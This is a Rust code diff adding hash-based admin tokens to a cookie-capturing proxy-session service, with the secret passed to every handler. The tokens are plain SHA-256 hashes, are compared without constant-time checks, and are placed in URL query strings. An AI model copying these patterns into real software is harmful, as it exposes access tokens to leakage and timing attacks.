@@ -3,6 +3,8 @@ use serde::{Deserialize, Serialize};
 use chrono::{Utc, Duration};
 use sqlx::SqlitePool;
 use std::time::Duration as StdDuration;
+use sha2::{Sha256, Digest};
+use base64::{Engine as _, engine::general_purpose};
 
 use crate::cookie_capture::CookieCapture;
 use crate::vault::Vault;
@@ -70,15 +72,30 @@ pub struct SessionStatusResponse {
 #[derive(Clone)]
 pub struct ProxySession {
     proxy_domain: String,
+    proxy_secret: String,
     cookie_capture: CookieCapture,
 }
 
 impl ProxySession {
-    pub fn new(proxy_domain: String, vault: Vault) -> Self {
+    pub fn new(proxy_domain: String, proxy_secret: String, vault: Vault) -> Self {
         Self {
             proxy_domain,
+            proxy_secret,
             cookie_capture: CookieCapture::new(vault),
         }
+    }
+    
+    /// Generate a simple admin token for proxy access (hash-based)
+    pub fn generate_admin_token(&self, token_id: &str) -> String {
+        let mut hasher = Sha256::new();
+        hasher.update(format!("{}:{}", token_id, self.proxy_secret).as_bytes());
+        general_purpose::URL_SAFE_NO_PAD.encode(hasher.finalize())
+    }
+    
+    /// Verify an admin token for proxy access
+    pub fn verify_admin_token(&self, token_id: &str, admin_token: &str) -> bool {
+        let expected = self.generate_admin_token(token_id);
+        admin_token == expected
     }
 
     /// Create a new proxy session for a token
@@ -89,7 +106,8 @@ impl ProxySession {
     ) -> anyhow::Result<ProxySessionData> {
         let id = uuid::Uuid::new_v4().to_string();
         let now = Utc::now();
-        let proxy_url = format!("https://{}/s/{}/", self.proxy_domain, token_id);
+        let admin_token = self.generate_admin_token(token_id);
+        let proxy_url = format!("https://{}/s/{}/?admin_token={}", self.proxy_domain, token_id, admin_token);
         let expires_at = now + Duration::hours(24); // 24 hour expiry
         
         let session = ProxySessionData {
@@ -413,6 +431,7 @@ pub async fn create_proxy_session_handler(
     let token_id = path.into_inner();
     let proxy_session = ProxySession::new(
         state.config.proxy_domain.clone(),
+        state.config.proxy_secret.clone(),
         state.vault.clone(),
     );
     
@@ -445,6 +464,7 @@ pub async fn get_proxy_session_status_handler(
     let token_id = path.into_inner();
     let proxy_session = ProxySession::new(
         state.config.proxy_domain.clone(),
+        state.config.proxy_secret.clone(),
         state.vault.clone(),
     );
     
@@ -468,6 +488,7 @@ pub async fn kill_proxy_session_handler(
     let token_id = path.into_inner();
     let proxy_session = ProxySession::new(
         state.config.proxy_domain.clone(),
+        state.config.proxy_secret.clone(),
         state.vault.clone(),
     );
     
@@ -497,6 +518,7 @@ pub async fn get_proxy_session_url_handler(
     let token_id = path.into_inner();
     let proxy_session = ProxySession::new(
         state.config.proxy_domain.clone(),
+        state.config.proxy_secret.clone(),
         state.vault.clone(),
     );
     
@@ -526,6 +548,7 @@ pub async fn refresh_proxy_session_handler(
     let token_id = path.into_inner();
     let proxy_session = ProxySession::new(
         state.config.proxy_domain.clone(),
+        state.config.proxy_secret.clone(),
         state.vault.clone(),
     );
     
@@ -553,6 +576,7 @@ pub async fn list_active_sessions_handler(
 ) -> impl Responder {
     let proxy_session = ProxySession::new(
         state.config.proxy_domain.clone(),
+        state.config.proxy_secret.clone(),
         state.vault.clone(),
     );
     
@@ -579,6 +603,7 @@ pub async fn run_proxy_session_refresh_cycle(state: web::Data<AppState>) {
     
     let proxy_session = ProxySession::new(
         state.config.proxy_domain.clone(),
+        state.config.proxy_secret.clone(),
         state.vault.clone(),
     );
     
